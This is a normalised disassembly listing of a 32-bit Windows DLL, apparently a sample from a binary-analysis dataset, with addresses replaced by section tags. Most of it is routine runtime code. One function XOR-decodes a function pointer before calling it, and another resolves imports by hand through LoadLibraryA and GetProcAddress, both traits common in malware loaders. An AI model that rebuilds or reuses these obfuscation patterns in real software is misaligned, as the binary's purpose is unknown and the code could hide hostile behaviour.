add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_10003250
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
pop esi
retn
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
sub_10003290
push ebp
mov ebp esp
push ecx
mov ecx [ eax ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ eax + 0x4 ]
mov [ ebp - 0x4 ] 0x0
cmp ecx edi
je r-xdata
mov ecx [ ebx + 0x14 ]
cmp ecx 0x10
jb r-xdata
lea ebx [ ebx ]
mov eax ebx
mov eax [ ebx ]
jmp r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov edx [ ebx + 0x10 ]
add edx eax
cmp ecx 0x10
jb r-xdata
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
mov edx [ ecx + 0x10 ]
add edx eax
cmp esi 0x10
jb r-xdata
and eax 0x8000003f
jns r-xdata
nop
xor eax eax
cmp ecx edx
je r-xdata
add [ ebp - 0x4 ] esi
add ecx 0x1c
cmp ecx edi
jne r-xdata
movsx ebx [ eax ]
inc eax
add esi ebx
cmp eax edx
jne r-xdata
xor esi esi
cmp eax edx
je r-xdata
imul eax [ ebp - 0x4 ]
pop edi
pop esi
and eax 0x3f
pop ebx
mov esp ebp
pop ebp
retn 0x4
dec eax
or eax 0xffffffc0
inc eax
movsx esi [ ecx ]
inc ecx
add eax esi
cmp ecx edx
jne r-xdata
mov esi [ ecx + 0x14 ]
cmp esi 0x10
jb r-xdata
mov ebx [ ebp + 0x8 ]
sub_10003340
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea esi [ eax + 0x1 ]
push esi
call sub_1002b2d3
add esp 0x4
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov ecx eax
sub ecx edi
lea ecx [ ecx ]
mov dl [ edi ]
mov [ ecx + edi ] dl
inc edi
dec esi
jne r-xdata
sub_1000337d
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
push sub_10083c23
mov [ rw-data ] 0x1
call sub_1006988c
pop ecx
sub_100033b0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0x38 ]
mov [ ebp - 0x4 ] esi
mov [ esi ] r--data
test ebx ebx
je r-xdata
lea ecx [ esi + 0x4 ]
call sub_100087a3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edi [ ebx ]
test edi edi
je r-xdata
push ebx
call sub_1000a86e
add esp 0x4
pop edi
push 0x0
lea ecx [ ebp - 0x8 ]
call sub_1000c927
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x8 ]
not esi
call sub_10003c9c
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov esi [ ebp - 0x4 ]
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_10003430
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10015c68
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
pop edi
mov [ esi + 0x10 ] ecx
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10003460
push ebp
mov ebp esp
push 0xffffffff
push sub_100891eb
mov eax [ fs : 0x0 ]
push eax
sub esp 0xd0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
call [ GetCurrentThreadId@IAT ]
cmp [ esi + 0x374 ] eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc0 ]
mov eax 0x156
call sub_10069020
xor eax eax
mov [ ebp - 0xdc ] ax
mov eax edx
mov [ ebp - 0xc8 ] 0x7
mov [ ebp - 0xcc ] 0x0
lea edx [ eax + 0x2 ]
nop
xor eax eax
jmp r-xdata
push 0x1503
push sub_1000a3f0
push sub_10027710
push sub_10040dc0
push 0x0
push edi
push r--data
push eax
mov eax [ esi + 0x38c ]
mov [ esi + 0x40 ] 0x1
call eax
add esp 0x20
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea ecx [ ebp - 0xc0 ]
push ecx
lea ecx [ ebp - 0xdc ]
call sub_10034100
lea edx [ ebp - 0xdc ]
mov ecx 0x6
mov [ ebp - 0x4 ] 0x0
call sub_10022b50
cmp [ ebp - 0xc8 ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xdc ]
push edx
call sub_1000a86e
add esp 0x4
sub_10003574
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10 ] 0x0
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax ecx
mov ecx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
add eax 0x8
push eax
push edi
mov [ esi ] ecx
mov ecx [ edi ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
mov [ ebp - 0x14 ] ecx
call sub_10063545
mov ebx eax
add esp 0x10
test ebx ebx
jg r-xdata
mov eax [ esi ]
mov ecx [ ebp + 0x10 ]
dec ebx
sub ecx eax
cmp ecx ebx
jge r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x14 ]
mov [ edi ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x10
push ebx
lea ecx [ ebp - 0xc ]
push ecx
push eax
call sub_1007f580
add esp 0xc
add [ esi ] ebx
sub_10003610
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x14 ] eax
mov al 0x38
xor [ ebp - 0x14 ] al
xor [ ebp - 0x13 ] al
xor [ ebp - 0x12 ] al
xor [ ebp - 0x11 ] al
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] 0x6
call [ ebp - 0x14 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10003660
push ebp
mov ebp esp
push 0xffffffff
push sub_10089f7d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x124
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0xb4 ] 0x10
mov eax [ ebp + 0xc ]
mov edi [ ebx + 0xb0 ]
lea esi [ ebx + 0xa0 ]
mov [ ebp - 0x124 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x130 ] eax
mov [ ebp - 0x10c ] ebx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x12c ] edx
mov [ ebp - 0x128 ] esi
mov eax edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
sete al
test al al
je r-xdata
xor eax eax
cmp edi ecx
setne al
cmp eax ecx
push 0x0
push r--data
push eax
call sub_100021f0
xor ecx ecx
add esp 0xc
cmp eax ecx
jne r-xdata
cmp [ ebx ] cl
jne r-xdata
mov eax 0x44
jmp r-xdata
mov edi ebx
mov [ ebp - 0xf8 ] ecx
mov [ ebp - 0x104 ] ecx
call sub_10023140
mov edi eax
mov [ ebp - 0x100 ] edi
test edi edi
je r-xdata
mov eax 0x45
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x10
mov eax 0x43
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x124 ]
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
mov ebx [ ebp + 0x10 ]
push eax
lea edx [ ebp - 0x104 ]
lea ecx [ ebp - 0xf8 ]
call sub_1002b500
test eax eax
jne r-xdata
mov edx edi
call sub_1006efb0
mov ecx [ ebp - 0x130 ]
mov edx [ ebp - 0x12c ]
push ecx
mov ecx [ ebp - 0x110 ]
push edx
mov edx [ ebp - 0x104 ]
push ecx
push eax
mov eax [ ebp - 0xf8 ]
push edx
push eax
call sub_10071720
push esi
lea ecx [ ebp - 0xa0 ]
mov ebx eax
call sub_1000aed0
push ebx
lea esi [ ebp - 0x84 ]
mov [ ebp - 0x4 ] 0x0
call sub_10028530
mov ecx esi
push ecx
lea edx [ ebp - 0xa0 ]
push edx
lea eax [ ebp - 0xbc ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_10066ab0
add esp 0xc
lea edx [ ebp - 0x68 ]
mov eax 0x54
mov [ ebp - 0x4 ] 0x2
call sub_10071e30
mov eax [ ebx + 0x4 ]
push eax
lea ecx [ ebp - 0xd8 ]
push ecx
call sub_10057f20
push eax
lea edx [ ebp - 0x68 ]
lea esi [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0x3
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0xd0
mov [ ebp - 0x4 ] 0x4
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0x2
call sub_100702e0
mov edx [ ebx + 0x38 ]
sub edx [ ebx + 0x34 ]
xor eax eax
sar edx 0x5
mov [ ebp - 0x114 ] eax
test edx edx
je r-xdata
cmp [ ebp - 0x110 ] 0x0
jne r-xdata
mov [ ebp - 0x108 ] eax
mov eax [ ebp - 0xf8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x84 ]
mov edx edi
call sub_1006f6e0
cmp eax 0x42
je r-xdata
mov ecx [ ebp - 0x10c ]
fnstcw [ ebp - 0xfa ]
movzx eax [ ebp - 0xfa ]
fmul [ ecx + 0xf8 ]
or eax 0xc00
mov [ ebp - 0x11c ] eax
fldcw [ ebp - 0x11c ]
fistp [ ebp - 0x120 ]
mov edx [ ebp - 0x120 ]
push edx
fldcw [ ebp - 0xfa ]
call [ Sleep@IAT ]
cmp esi 0x42
je r-xdata
fadd [ r--data ]
mov esi ebx
call sub_10008740
lea ecx [ ebp - 0xbc ]
call sub_10003250
lea ecx [ ebp - 0x84 ]
call sub_10003250
lea ecx [ ebp - 0xa0 ]
call sub_10003250
xor eax eax
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ edi + 0xd4 ] 0x0
cmp eax 0x43
jne r-xdata
mov edx [ ebp - 0x100 ]
mov [ edx + 0xd4 ] 0x0
jmp r-xdata
cmp esi 0x43
je r-xdata
mov esi ebx
call sub_10008740
lea ecx [ ebp - 0xbc ]
call sub_10003250
lea ecx [ ebp - 0x84 ]
call sub_10003250
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10003250
mov edi [ ebp - 0x10c ]
xor eax eax
mov [ ebp - 0xf8 ] eax
mov [ ebp - 0x104 ] eax
call sub_10023140
mov [ ebp - 0x100 ] eax
test eax eax
jne r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea edx [ ebp - 0x30 ]
mov eax 0x57
call sub_10071e30
mov eax [ ebx + 0x4 ]
push eax
lea ecx [ ebp - 0xf4 ]
push ecx
call sub_10057f20
push eax
lea edx [ ebp - 0x30 ]
lea esi [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0x5
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0xd0
mov [ ebp - 0x4 ] 0x6
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0xf4 ]
call sub_100702e0
mov eax [ ebp - 0xf8 ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x38 ]
sub ecx [ ebx + 0x34 ]
mov eax [ ebp - 0x114 ]
add [ ebp - 0x108 ] 0x20
inc eax
sar ecx 0x5
mov [ ebp - 0x114 ] eax
cmp eax ecx
jb r-xdata
mov esi [ ebp - 0x128 ]
mov edi [ ebp - 0x100 ]
call [ GetTickCount@IAT ]
mov edx [ ebx + 0x34 ]
add edx [ ebp - 0x108 ]
mov ecx [ ebp - 0x100 ]
mov edi eax
lea eax [ ebp - 0xbc ]
push eax
call sub_10024a00
mov esi eax
call [ GetTickCount@IAT ]
sub eax edi
mov [ ebp - 0x11c ] eax
fild [ ebp - 0x11c ]
jns r-xdata
mov edi [ ebp - 0x100 ]
sub_10003ab0
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov ax [ ebp + 0x8 ]
mov edx 0xffff
cmp dx ax
jne r-xdata
mov edx [ esi + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
push ebx
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x3c ]
cmp eax ecx
jae r-xdata
test [ esi + 0x40 ] 0x2
jne r-xdata
mov ecx [ esi + 0x34 ]
mov ebx [ ecx ]
mov edx edi
lea ebx [ edx + ebx * 2 ]
cmp edx ebx
jae r-xdata
mov edi [ esi + 0x34 ]
mov edi [ edi ]
lea eax [ eax + edi * 2 ]
sub eax ecx
mov [ edx ] ecx
mov ecx [ esi + 0x34 ]
sar eax 0x1
mov [ ecx ] eax
pop ebx
pop edi
mov eax 0xffff
pop esi
mov esp ebp
pop ebp
retn 0x4
test edi edi
jne r-xdata
dec [ ecx ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
pop ebx
lea edx [ ecx + 0x2 ]
mov [ esi ] edx
pop edi
mov [ ecx ] ax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x34 ]
mov ebx [ eax ]
mov ecx [ esi + 0x10 ]
add ebx ebx
sub ebx [ ecx ]
add ebx edi
sar ebx 0x1
xor ebx ebx
jmp r-xdata
test eax eax
je r-xdata
mov eax 0x20
jmp r-xdata
mov eax ebx
shr eax 0x1
cmp eax 0x20
jae r-xdata
lea ecx [ ecx ]
mov edx 0x7fffffff
sub edx eax
cmp edx ebx
jae r-xdata
test eax eax
jne r-xdata
shr eax 0x1
jne r-xdata
add eax ebx
push eax
lea ecx [ esi + 0x44 ]
mov [ ebp - 0x4 ] eax
call sub_1004a5e0
mov edi eax
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov [ esi + 0x3c ] edi
mov [ eax ] edi
mov edx [ esi + 0x24 ]
mov eax [ ebp - 0x4 ]
mov [ edx ] edi
lea edx [ eax + eax ]
mov eax [ esi + 0x34 ]
sar edx 0x1
mov [ eax ] edx
test [ esi + 0x40 ] 0x4
jne r-xdata
lea edx [ ebx + ebx ]
push edx
push ecx
push edi
call sub_1007f580
mov ecx [ ebp - 0x8 ]
add esp 0xc
test ebx ebx
jne r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] edi
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov edx [ esi + 0x30 ]
sar edi 0x1
mov [ edx ] edi
jmp r-xdata
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov edx [ esi + 0x20 ]
mov [ edx ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov edx [ esi + 0x3c ]
sub edx ecx
sar edx 0x1
lea eax [ edi + edx * 2 ]
mov edx [ esi + 0x24 ]
mov [ esi + 0x3c ] eax
mov eax [ edx ]
mov edx [ esi + 0x14 ]
mov ebx [ edx ]
sub ebx ecx
sub eax ecx
sar ebx 0x1
sar eax 0x1
lea ebx [ edi + ebx * 2 ]
mov [ edx ] ebx
mov edx [ esi + 0x24 ]
lea eax [ edi + eax * 2 ]
mov [ edx ] eax
mov edx [ ebp - 0x4 ]
add edx edx
sub edx eax
mov eax [ esi + 0x34 ]
add edx edi
sar edx 0x1
mov [ eax ] edx
test [ esi + 0x40 ] 0x4
je r-xdata
test [ esi + 0x40 ] 0x1
je r-xdata
mov edx [ esi + 0x20 ]
mov edx [ edx ]
mov eax [ esi + 0x24 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub edx ecx
sar edx 0x1
lea edx [ edi + edx * 2 ]
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
sub eax edx
mov [ edi ] edx
mov edx [ esi + 0x30 ]
add eax 0x2
sar eax 0x1
mov [ edx ] eax
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea eax [ ecx + 0x2 ]
mov [ esi ] eax
mov ax [ ebp + 0x8 ]
pop ebx
pop edi
mov [ ecx ] ax
pop esi
mov esp ebp
pop ebp
retn 0x4
push ecx
call sub_1000a86e
add esp 0x4
sub_10003cc0
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edi ] ecx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebp
retn 0x8
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov [ edi ] edx
pop edi
pop esi
pop ebp
retn 0x8
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ edi + 0x4 ] edx
mov [ edi ] eax
pop edi
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_10003d2a
push 0x60
mov eax sub_100856ed
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
or [ ebp - 0x50 ] 0xffffffff
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x20 ]
xor ebx ebx
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x24 ]
inc ebx
test [ esi + 0x14 ] 0x4000
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x6c ] eax
mov ecx esi
je r-xdata
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x5c ] edi
call sub_10007a10
mov esi [ esi + 0x14 ]
lea ecx [ ebp - 0x5c ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x4
call sub_1004ad92
add esp 0x18
push eax
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10046885
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x60 ]
mov esi eax
call sub_1002be90
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x64 ] eax
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10007a10
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_10064f10
pop ecx
or esi 0xffffffff
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_1002be90
push edi
xor eax eax
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x38 ] 0x7
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4c ] ax
call sub_1003e410
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_10027430
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_1006da10
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_1006d830
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_10004190
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1005aac0
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_1006da10
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_1006d830
cmp [ ebp - 0x38 ] 0x8
mov eax [ ebp - 0x4c ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
mov eax [ ebp - 0x58 ]
je r-xdata
cmp [ ebp - 0x5c ] edi
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100124be
add esp 0x10
push edi
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_1006d830
jmp r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x50 ] edi
jge r-xdata
or [ eax ] ebx
cmp esi ebx
ja r-xdata
mov ecx [ ebp - 0x6c ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x68 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_10003ee0
push ebp
mov ebp esp
sub esp 0x8
mov ecx [ eax + 0x8 ]
push esi
mov esi [ ecx + 0x80 ]
mov eax [ esi + ebx + 0xc ]
add esi ebx
mov [ ebp - 0x4 ] esi
test eax eax
je r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
push edi
jmp r-xdata
add eax ebx
push eax
call [ LoadLibraryA@IAT ]
mov edi [ esi ]
mov esi [ esi + 0x10 ]
add edi ebx
mov ecx eax
mov eax [ edi ]
add esi ebx
mov [ ebp - 0x8 ] ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x14
mov [ ebp - 0x4 ] eax
mov eax [ eax + 0xc ]
test eax eax
jne r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
pop edi
add eax ebx
jns r-xdata
add eax 0x2
and eax 0xffff
jmp r-xdata
mov ecx [ ebp - 0x8 ]
push eax
push ecx
call [ GetProcAddress@IAT ]
add edi 0x4
mov [ esi ] eax
mov eax [ edi ]
add esi 0x4
test eax eax
jne r-xdata
sub_10003f61
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_100315c0
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1001f911
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1002262f
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x20
sub_10004023
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_1008060d
add esp 0x14
pop ebp
retn
sub_1000404e
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1006ee94
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1000f103
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100234cf
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x18
sub_100040bc
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_100040e2
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
je r-xdata
leave
retn
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_10051cf5
mov esi [ ebp - 0x14 ]
mov ecx [ esi + 0x14 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
mov eax 0x100
push 0x1
cmp [ ebp + 0x8 ] ax
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
lea edx [ ebp - 0x4 ]
push edx
push 0x1
lea edx [ ebp + 0x8 ]
push edx
push eax
push ecx
call sub_10030f03
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push [ ebp + 0x8 ]
call sub_1005c353
pop ecx
test eax eax
movzx eax [ ebp + 0x8 ]
pop ecx
je r-xdata
movzx eax ax
jmp r-xdata
add ax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ esi + 0xcc ]
movzx eax [ ecx + eax ]
jmp r-xdata
pop esi
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10004190
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_10030594
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
cmp edi 0x7ffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_10030594
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10071bf0
test edi edi
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ esi + 0x10 ]
push eax
push ebx
push ecx
mov ecx esi
call sub_1006de60
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x8
jb r-xdata
pop edi
mov eax esi
xor edx edx
mov [ eax + edi * 2 ] dx
mov eax [ esi ]
xor edx edx
mov [ eax + edi * 2 ] dx
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
pop edi
mov eax esi
xor edx edx
pop esi
mov [ eax ] dx
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
xor edx edx
pop edi
mov [ eax ] dx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
sub_10004247
mov edi edi
push ebp
mov ebp esp
push esi
